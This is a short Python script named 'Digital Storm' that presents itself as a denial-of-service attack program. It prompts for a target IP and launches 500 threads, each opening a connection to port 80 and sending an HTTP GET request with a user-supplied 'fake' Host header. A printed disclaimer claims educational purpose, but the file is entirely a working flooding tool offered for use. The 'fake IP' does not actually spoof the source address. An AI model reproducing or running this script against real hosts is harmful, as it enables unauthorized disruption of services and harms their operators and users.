import socket
import threading
import pyfiglet
import colorama
from colorama import Fore

colorama.init()
ascii_banner = pyfiglet.figlet_format("Digital Storm")
print(Fore.RED + ascii_banner)

print("Distributed Denial of Serice(DDoS) Attack Program")
print("-" * 50)
print("[*] DISCLAIMER: THIS SCRIPT IS ONLY TO BE USED FOR EDUCATIONAL PURPOSES. PLEASE GAIN ACCESS TO CONSENT TO ANY IP ADDRESS YOU MAY TEST THIS ON.")
print("[*] THIS SCRIPT WILL ONLY ATTACK PORT 80")
print("-" * 50)

# Target IP address
target = input("Enter target IP: ")

# Port to attack
port = 80

# Fake IP address to use in the attack
fake_ip = input("Enter HOST IP: ")

# Function to run the attack
def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode(), (target, port))
    s.close()

# Start 500 threads to run the attack
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()